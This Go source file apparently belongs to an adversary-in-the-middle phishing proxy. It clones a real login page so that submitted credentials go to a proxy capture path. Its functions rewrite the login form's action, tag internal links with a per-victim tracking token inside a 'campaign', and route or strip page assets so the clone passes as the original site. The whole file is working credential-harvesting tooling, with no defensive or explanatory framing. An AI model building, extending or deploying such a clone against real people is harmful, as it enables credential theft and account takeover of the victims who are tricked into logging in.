package aitmproxy

import (
	"bytes"
	"net/url"
	"strings"

	"golang.org/x/net/html"
)

// tokenSentinel marks where the victim token is injected into the stored clone.
// The clone is generated once per campaign (shared across victims), so the token
// cannot be baked in at generation; the sentinel is replaced with the specific
// victim's token at serve time (serveClone). It is deliberately a token-safe
// literal (word chars only) so url.Values.Encode never escapes it.
const tokenSentinel = "__PFT_TOKEN__"

// rewriteOpts drives the deterministic static HTML transform.
type rewriteOpts struct {
	upstreamHost       string // the real login origin host (same as Compiled.Upstream.Host)
	loginPath          string // the proxy path a login form must POST to (capture path)
	formActionContains string // narrows which form actions are the login surface
	tokenKey           string // token query key (proxy.token_query_key)
	assetPolicy        string // proxy | inline | strip
}

// rewriteHTML applies the Phase 2 static clone transform to a fetched login page:
//
//   - the login form's action is rewritten to the proxy login path (so the POST
//     hits the capture path), preserving form_action_contains matching semantics;
//   - internal anchors (relative, or absolute/protocol-relative to the upstream
//     host) are rewritten root-relative and carry the token query key (with the
//     serve-time sentinel) so the tracking chain survives in-page navigation;
//   - asset references (img/script/link/source) are rewritten per asset_policy.
//
// External links/assets are left untouched. The transform is deterministic: the
// same input + opts always produce the same output (the basis for the snapshot
// hash).
func rewriteHTML(src []byte, o rewriteOpts) ([]byte, error) {
	doc, err := html.Parse(bytes.NewReader(src))
	if err != nil {
		return nil, err
	}
	var walk func(*html.Node)
	walk = func(n *html.Node) {
		if n.Type == html.ElementNode {
			switch n.Data {
			case "form":
				rewriteAttr(n, "action", func(v string) string {
					if matchesLoginAction(v, o.loginPath, o.formActionContains) {
						return appendQueryParam(o.loginPath, o.tokenKey, tokenSentinel)
					}
					return v
				})
			case "a":
				rewriteAttr(n, "href", func(v string) string {
					if p, ok := internalPath(v, o.upstreamHost); ok {
						return appendQueryParam(p, o.tokenKey, tokenSentinel)
					}
					return v
				})
			case "img", "script", "source", "iframe", "audio", "video", "embed":
				rewriteAttr(n, "src", func(v string) string { return rewriteAsset(v, o) })
			case "link":
				rewriteAttr(n, "href", func(v string) string { return rewriteAsset(v, o) })
			}
		}
		for c := n.FirstChild; c != nil; c = c.NextSibling {
			walk(c)
		}
	}
	walk(doc)

	var buf bytes.Buffer
	if err := html.Render(&buf, doc); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

// rewriteAttr applies fn to the first attribute named key on n (in place).
func rewriteAttr(n *html.Node, key string, fn func(string) string) {
	for i := range n.Attr {
		if n.Attr[i].Key == key {
			n.Attr[i].Val = fn(n.Attr[i].Val)
			return
		}
	}
}

// matchesLoginAction reports whether a form action targets the login surface.
// When form_action_contains is set it narrows by substring (the schema's
// matching semantics); otherwise the action path must equal the login path. An
// already-proxied action (== login path) still matches, so the rewrite is
// idempotent.
func matchesLoginAction(action, loginPath, formActionContains string) bool {
	if strings.TrimSpace(formActionContains) != "" {
		return strings.Contains(action, formActionContains)
	}
	if strings.TrimSpace(action) == "" {
		return false
	}
	if u, err := url.Parse(action); err == nil {
		return u.Path == loginPath
	}
	return action == loginPath
}

// internalPath reports whether raw is an in-proxy navigational link and, if so,
// returns its root-relative form. Relative links are internal by definition;
// absolute/protocol-relative links are internal only when they target the
// upstream host. Fragments and non-navigational schemes are not rewritten.
func internalPath(raw, host string) (string, bool) {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return "", false
	}
	low := strings.ToLower(raw)
	for _, p := range []string{"#", "mailto:", "tel:", "javascript:", "data:"} {
		if strings.HasPrefix(low, p) {
			return "", false
		}
	}
	u, err := url.Parse(raw)
	if err != nil {
		return "", false
	}
	switch {
	case u.Scheme == "http" || u.Scheme == "https":
		if strings.EqualFold(u.Hostname(), host) {
			return rootRel(u), true
		}
		return "", false // external absolute
	case u.Scheme != "":
		return "", false // other scheme (ftp, ws, …)
	case strings.HasPrefix(raw, "//"):
		if strings.EqualFold(u.Hostname(), host) {
			return rootRel(u), true
		}
		return "", false // protocol-relative to another host
	default:
		return raw, true // relative path — same-origin to the proxy
	}
}

// rewriteAsset transforms an asset URL per asset_policy. proxy/inline route
// upstream-absolute refs through the proxy (root-relative) and leave external
// ones alone; strip removes absolute/protocol-relative asset loads entirely.
func rewriteAsset(raw string, o rewriteOpts) string {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return raw
	}
	low := strings.ToLower(raw)
	for _, p := range []string{"#", "data:", "javascript:", "mailto:"} {
		if strings.HasPrefix(low, p) {
			return raw
		}
	}
	u, err := url.Parse(raw)
	if err != nil {
		return raw
	}
	isAbs := u.Scheme == "http" || u.Scheme == "https"
	isProtoRel := u.Scheme == "" && strings.HasPrefix(raw, "//")
	upstream := (isAbs || isProtoRel) && strings.EqualFold(u.Hostname(), o.upstreamHost)

	if o.assetPolicy == "strip" {
		if isAbs || isProtoRel {
			return "" // do not load external/absolute assets
		}
		return raw
	}
	// proxy (default) / inline: stream upstream-absolute assets through the proxy.
	if upstream {
		return rootRel(u)
	}
	return raw
}

// rootRel renders a URL as a root-relative path (path + query + fragment),
// discarding scheme/host so it resolves against the proxy listener.
func rootRel(u *url.URL) string {
	out := u.EscapedPath()
	if out == "" {
		out = "/"
	}
	if u.RawQuery != "" {
		out += "?" + u.RawQuery
	}
	if u.Fragment != "" {
		out += "#" + u.Fragment
	}
	return out
}

// appendQueryParam sets key=val on a path's query, preserving existing params.
func appendQueryParam(rawPath, key, val string) string {
	u, err := url.Parse(rawPath)
	if err != nil {
		return rawPath
	}
	q := u.Query()
	q.Set(key, val)
	u.RawQuery = q.Encode()
	return u.String()
}
